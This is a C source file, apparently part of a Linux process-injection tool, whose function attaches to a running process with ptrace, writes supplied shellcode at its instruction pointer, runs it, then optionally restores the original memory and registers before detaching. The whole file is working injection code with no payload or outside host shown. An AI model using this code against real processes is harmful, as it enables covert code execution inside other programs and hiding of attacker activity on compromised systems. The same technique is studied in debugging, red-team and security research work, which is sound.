#include <sys/wait.h>

#include "inject.h"
#include "common.h"
#include "mem.h"
#include "ptrace.h"

writecb memwrite = ignotum_mem_write;
readcb memread = ignotum_mem_read;

void ps_inject(const char *sc, size_t len, inject_t *options){
    char *backup = NULL;
    int status;
    long ip;
    regs_t old_regs;

    ssize_t n;

    info("attaching process %d\n", options->pid);
    ptrace_attach(options->pid);
    good("process attached\n");

    ptrace(PTRACE_GETREGS, options->pid, NULL, &old_regs);

    /* skip system call, e.g, select, poll, nanosleep */
    ip = old_regs.instruction_point+4;
    setreg(options->pid, IP, ip);

    if(options->restore){
        backup = xmalloc(len+BREAKPOINT_LEN);
        info("backup previously instructions ...\n");
        n = memread(options->pid, backup, len+BREAKPOINT_LEN, ip);
        info("%zd byte(s) read of %zu\n", n, len+BREAKPOINT_LEN);
    }

    info("writing shellcode on memory ...\n");
    n = memwrite(options->pid, sc, len, ip);
    info("%zd byte(s) written of %zu\n", n, len);

    good("shellcode inject !!!\n");

    if(options->restore){
        info("resuming application ...\n");
        memwrite(options->pid, BREAKPOINT, BREAKPOINT_LEN, ip+len);

        ptrace(PTRACE_CONT, options->pid, NULL, 0);
        waitpid(options->pid, &status, 0);

        info("restoring memory instructions\n");
        memwrite(options->pid, backup, len+BREAKPOINT_LEN, ip);
        free(backup);

        if(options->restore_ip){
            ptrace(PTRACE_SETREGS, options->pid, NULL, &old_regs);
        } else {
            #if defined(__x86_64__) || defined(__i386__)
                setreg(options->pid, IP, getreg(options->pid, IP)-BREAKPOINT_LEN);
            #endif
        }
    }

    info("detaching pid ...\n");
    ptrace(PTRACE_DETACH, options->pid, NULL, 0);


}
